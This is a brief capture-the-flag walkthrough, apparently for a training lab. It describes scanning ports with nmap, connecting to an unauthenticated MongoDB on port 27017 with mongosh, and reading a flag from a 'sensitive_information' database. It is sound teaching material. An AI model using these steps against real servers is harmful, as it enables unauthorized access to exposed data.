1. Scan ports (nmap)
2. Find that there is a mongodb running on port 27017
3. Install mongoshell (https://www.mongodb.com/try/download/shell)
3. Connect to the mongodb with the IP and port `mongosh --host <IP>:27017`
4. Scan dbs and collections `show dbs` and `use <db>` and `show collections`
5. Flag is under the `sensitive_information` db and `flag` collection
6. Use `db.flag.find().pretty()` to get the flag
7. Congrats! You have pwned the machine